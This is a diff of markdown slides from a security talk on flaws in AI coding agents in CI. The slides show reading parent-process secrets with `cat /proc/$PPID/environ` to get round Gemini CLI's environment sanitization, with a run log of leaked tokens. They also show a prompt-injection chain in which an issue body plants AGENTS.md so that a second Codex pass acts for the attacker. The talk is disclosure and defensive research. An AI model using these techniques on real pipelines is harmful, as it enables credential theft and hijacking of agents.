-environmentSanitization.ts - Gemini CLI core `// environmentSanitization.ts:13 const isStrictSanitization = !!processEnv['GITHUB_SHA'] || processEnv['SURFACE'] === 'Github'; if (!config.enableEnvironmentVariableRedaction && !isStrictSanitization) { return {...processEnv};         // ← interactive: complete no-op } // strict mode (CI/CD): build new object, only copy safe keys const results = {}; for (const [key, value] of Object.entries(processEnv)) { if (shouldRedactEnvironmentVariable(key, value, config)) continue; results[key] = value; } return results;`
+environmentSanitization.ts - Gemini CLI core
 
-`GITHUB_TOKEN` **absent** · `GEMINI_API_KEY` **absent** · `NOVEE_CANARY` **absent** Child env verified clean. Sanitization works.
+```
+// environmentSanitization.ts:13
+const isStrictSanitization =
+  !!processEnv['GITHUB_SHA'] || processEnv['SURFACE'] === 'Github';
+
+if (!config.enableEnvironmentVariableRedaction && !isStrictSanitization) {
+  return {...processEnv};         // ← interactive: complete no-op
+}
+
+// strict mode (CI/CD): build new object, only copy safe keys
+const results = {};
+for (const [key, value] of Object.entries(processEnv)) {
+  if (shouldRedactEnvironmentVariable(key, value, config)) continue;
+  results[key] = value;
+}
+return results;
+```
+
+`GITHUB_TOKEN` **absent** · `GEMINI_API_KEY` **absent** · `NOVEE_CANARY` **absent**
+
+Child env verified clean. Sanitization works.
 
 ## Slide 49
 
 #### SO WHERE DID THEY GO?
 
-Run `env` in the child. Nothing. Every secret stripped, exactly as advertised. Same UID. Same PID namespace. No `unshare` . No `hidepid` . So what does the kernel have to say about it?
+Run `env` in the child.
 
-\```
+Nothing. Every secret stripped, exactly as advertised.
+
+Same UID. Same PID namespace. No `unshare` . No `hidepid` .
+
+So what does the kernel have to say about it?
+
+```
 cat /proc/$PPID/environ | tr '\0' '\n'
-\```
+```
 
-> sanitizeEnvironment() **✕** ⚠<sup>Task failed successfully.</sup> OK
+sanitizeEnvironment() ✕
+
+⚠ Task failed successfully.
+
+OK
 
 THE SECRETS NEVER MOVED.
 
@@ -780,20 +926,11 @@ THE SECRETS NEVER MOVED.
 
 Real GitHub Actions run - deterministic, model-free, SHA-256 verified
 
-- **3/3 secrets leaked via /proc**
-
-
-> Read by a vision model from the page image (replacing unreliable OCR) — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
-```text
-THE PROOF
-
-Real GitHub Actions run - deterministic, model-free, SHA-256 verified
-
- Child /proc/self/environ: 0 bytes, 0 vars
-   NOVEE_CANARY: ABSENT (sanitization works)
-   GEMINI_API_KEY: ABSENT (sanitization works)
-   GITHUB_TOKEN: ABSENT (sanitization works)
+```
+Child /proc/self/environ: 0 bytes, 0 vars
+  NOVEE_CANARY: ABSENT (sanitization works)
+  GEMINI_API_KEY: ABSENT (sanitization works)
+  GITHUB_TOKEN: ABSENT (sanitization works)
 
 --- Process tree ---
   Level 1: PID 2182 -> parent PID 2175 (5072 bytes, cmd: node /tmp/proc-proof.js )
@@ -802,15 +939,13 @@ Real GitHub Actions run - deterministic, model-free, SHA-256 verified
   Level 4: PID 2025 -> parent PID 2011 (2727 bytes, cmd: /home/runner/actions-runner/cached/2.334.0/bin/Runner.Listener run )
   Level 5: PID 2011 -> parent PID 1872 (420 bytes, cmd: /opt/hca/hosted-compute-agent )
 
- === Secrets recovered from /proc/2175/environ ===
-   LEAKED: NOVEE_CANARY (length=27, sha256_prefix=b3b2a1b2483c9140)
-   LEAKED: GEMINI_API_KEY (length=39, sha256_prefix=3a16968595ee4d61)
-   LEAKED: GITHUB_TOKEN (length=40, sha256_prefix=1dd511c629c080b8)
-
-3/3 secrets leaked via /proc
-
-black hat USA 2026
+=== Secrets recovered from /proc/2175/environ ===
+  LEAKED: NOVEE_CANARY (length=27, sha256_prefix=b3b2a1b2483c9140)
+  LEAKED: GEMINI_API_KEY (length=39, sha256_prefix=3a16968595ee4d61)
+  LEAKED: GITHUB_TOKEN (length=40, sha256_prefix=1dd511c629c080b8)
 ```
+
+**3/3 secrets leaked via /proc**
 
 ## Slide 51
 
@@ -892,34 +1027,40 @@ ANOTHER ONE.
 
 #### NOT A PATCH
 
-THEY DIDN’T PATCH A BUG. THEY REPLACED THE TRUST MODEL.
-
-
-> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-NOT A PATCH
 Update to Gemini CLI and run-gemini-cli Trust Model
-(Critical ) bdmorgan published GHSA-wpqr-6v78-jr5g on Apr 24
-Package Affected versions Patched versions Severity
-Oi] @google/gemini-cli (nom) < 0.39.1 0.39.1 (Critical) 10.0 /10
-< 0.40.0-preview.3 0.40.0-preview.3
-© google-github-actions/run-gemini-cli (GitHub Actions) < 0.1.22 0.1.22 SVSE.NS base metrics
-Attack vector Network
-Attack complexity Low
-Description Privileges required None
-User interaction None
-Summary Scope Changed
-Confidentiality High
-Gemini CLI ( @google/gemini-cli ) and the run-gemini-cli GitHub Action are being updated to harden workspace trust and tool
-allowlisting, in particular when used in untrusted environments like GitHub Actions. This update introduces a breaking change to
-how non-interactive (headless) environments handle folder trust, which may impact existing Cl/CD workflows under specific earn more about base metrics
-conditions.
-Availability High
-THEY DIDN’T PATCH A BUG.
-THEY REPLACED THE TRUST MODEL.
-Black ha
-```
+
+Critical  bdmorgan published GHSA-wpqr-6v78-jr5g on Apr 24
+
+| Package | Affected versions | Patched versions |
+|---|---|---|
+| @google/gemini-cli (npm) | < 0.39.1 | 0.39.1 |
+| | < 0.40.0-preview.3 | 0.40.0-preview.3 |
+| google-github-actions/run-gemini-cli (GitHub Actions) | < 0.1.22 | 0.1.22 |
+
+Severity: Critical 10.0 / 10
+
+CVSS v3 base metrics
+
+- Attack vector: Network
+- Attack complexity: Low
+- Privileges required: None
+- User interaction: None
+- Scope: Changed
+- Confidentiality: High
+- Integrity: High
+- Availability: High
+
+Learn more about base metrics
+
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+
+Description
+
+Summary
+
+Gemini CLI ( @google/gemini-cli ) and the run-gemini-cli GitHub Action are being updated to harden workspace trust and tool allowlisting, in particular when used in untrusted environments like GitHub Actions. This update introduces a breaking change to how non-interactive (headless) environments handle folder trust, which may impact existing CI/CD workflows under specific conditions.
+
+THEY DIDN'T PATCH A BUG. THEY REPLACED THE TRUST MODEL.
 
 ## Slide 56
 
@@ -932,6 +1073,28 @@ CODEX
 **Codex** is OpenAI's coding agent. `codex-action` is a thin wrapper - installs the CLI, runs `codex exec` .
 
 `openai/codex` - `.github/workflows/issue-deduplicator.yml`
+
+```
+  1  name: Issue Deduplicator
+  2
+  3  on:
+  4    issues:
+  5      types:
+  6        - opened
+  7        - labeled
+
+ 19        steps:
+ 20          - uses: actions/checkout@v6
+
+ 78          - id: codex-all
+ 79            name: Find duplicates (pass 1, all issues)
+ 80            uses: openai/codex-action@main
+
+161          - id: codex-open
+162            name: Find duplicates (pass 2, open issues)
+163            if: ${{ steps.normalize-all.outputs.has_matches != 'true' }}
+164            uses: openai/codex-action@main
+```
 
 **One job. One checkout. Two Codex passes. Same workspace.**
 
@@ -964,7 +1127,26 @@ jobs:
 
 #### THE SANDBOX
 
-They wrote the threat model down themselves: `// seatbelt.rs - their own threat-model comment a bad actor could write .git/hooks/pre-commit so an unsuspecting user runs code as privileged the next time they git commit … …or set .codex/config.toml → sandbox_mode = "danger-full-access" // protocol.rs - read-only subpaths under a writable root let top_level_git = writable_root.join(".git"); if top_level_git.is_dir() { subpaths.push(top_level_git); } // .git/ ✓ for subdir in &[".agents", ".codex"] {                      // .agents/ .codex/ ✓ let p = writable_root.join(subdir); if p.is_dir() { subpaths.push(p); } } .git/ ✓ .codex/ ✓ .agents/ ✓`
+They wrote the threat model down themselves:
+
+```
+// seatbelt.rs - their own threat-model comment
+a bad actor could write .git/hooks/pre-commit so an unsuspecting
+user runs code as privileged the next time they git commit …
+…or set .codex/config.toml → sandbox_mode = "danger-full-access"
+```
+
+```
+// protocol.rs - read-only subpaths under a writable root
+let top_level_git = writable_root.join(".git");
+if top_level_git.is_dir() { subpaths.push(top_level_git); } // .git/ ✓
+for subdir in &[".agents", ".codex"] {                      // .agents/ .codex/ ✓
+    let p = writable_root.join(subdir);
+    if p.is_dir() { subpaths.push(p); }
+}
+```
+
+`.git/` ✓  `.codex/` ✓  `.agents/` ✓
 
 This makes sense - these are **Codex's own metadata** ; a write there escalates, so they lock it. A sandbox can't guard a file **you** chose to trust.
 
@@ -988,20 +1170,19 @@ items.push(UserInstructions { text: user_instructions, directory }); // injected
 
 #### THE ATTACK
 
-Attacker opens an issue - body contains
-1
-injection
-2
-Workflow fires. One job, one checkout
-Pass 1 processes issue body - writes
-3
-AGENTS.md
-Check passes - output is  "bug" . Check
-4
-is correct.
+1. Attacker opens an issue - body contains injection
 
-**5** Pass 2 loads `AGENTS.md` **Attacker controls the agent with GITHUB_TOKEN.**
+2. Workflow fires. One job, one checkout
 
+3. Pass 1 processes issue body - writes `AGENTS.md`
+
+4. Check passes - output is `"bug"` . Check is correct.
+
+5. Pass 2 loads `AGENTS.md`
+
+**Attacker controls the agent with GITHUB_TOKEN.**
+
+```
 # The multi-pass agent pattern
 on:
   issues: [opened]          # anyone can open an issue
@@ -1009,17 +1190,21 @@ jobs:
   triage:                   # ONE job, ONE workspace
     steps:
       - uses: actions/checkout@v6
+
       - uses: openai/codex-action@main  # Pass 1: Classify
         with:
           prompt: "Classify: ${{ github.event.issue.body }}"
           output-schema-file: schemas/classify.json
+
       - run: |                          # Deterministic check
           [[ "$LABEL" == "bug" || "$LABEL" == "security" ]] || exit 1
+
       - uses: openai/codex-action@main  # Pass 2: Act
         with:
           prompt: "Apply '$LABEL' label"
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+```
 
 ## Slide 62
 
@@ -1031,9 +1216,24 @@ THE DEVELOPER VALIDATED THE OUTPUT. THE ATTACKER WROTE THE INSTRUCTIONS.
 
 What changed after the report - `openai/codex` , `openai/codex-action`
 
-Before After One job. One checkout. Two jobs. A checkout each. Two passes, same workspace. Then the checkout removed entirely.
+Before
+
+One job. One checkout. Two passes, same workspace.
+
+After
+
+Two jobs. A checkout each. Then the checkout removed entirely.
 
 ISSUE-DEDUPLICATOR.YML · JOB gather-duplicates-all - PASS 1
+
+```
+61          uses: openai/codex-action@5c3f4ccdb2b8790f73d6b21751ac00e602aa0c02 # v1.7
+62          with:
+63            openai-api-key: ${{ secrets.CODEX_OPENAI_API_KEY }}
+64            allow-users: "*"
+65            safety-strategy: drop-sudo
+66            sandbox: read-only
+```
 
 Pass 2 is its own job now - `gather-duplicates-open` , with the same two lines.
 
@@ -1069,25 +1269,19 @@ This isn’t going away. Agents are becoming default infrastructure. The harness
 
 #### HOW TO AUDIT THE NEXT ONE
 
-**1**
-
-###### **List what it calls safe**
+**1 List what it calls safe**
 
 read-only · restricted · sanitized · pre-approved. Every one is a label somebody wrote.
 
-**2**
-
-###### **Find who acts on the label**
+**2 Find who acts on the label**
 
 Which component reads that decision - and with how much authority?
 
-######
+**3 Look for the handoff**
 
-**3** Decided in one place, consumed in another with more power. That's the bug.
+Decided in one place, consumed in another with more power. That's the bug.
 
-**4**
-
-###### **Read the defaults, not the docs**
+**4 Read the defaults, not the docs**
 
 The assumption isn't in your config. It's in their binary.
 
@@ -1097,4 +1291,11 @@ THE PRODUCT SAID IT WAS SAFE. THAT’S WHERE WE STARTED.
 
 ## Slide 68
 
-**Elad Meged** Novee Security elad@novee.security **in** linkedin.com/in/eladmeged
+**Elad Meged**
+
+Novee Security
+
+elad@novee.security
+
+linkedin.com/in/eladmeged
+
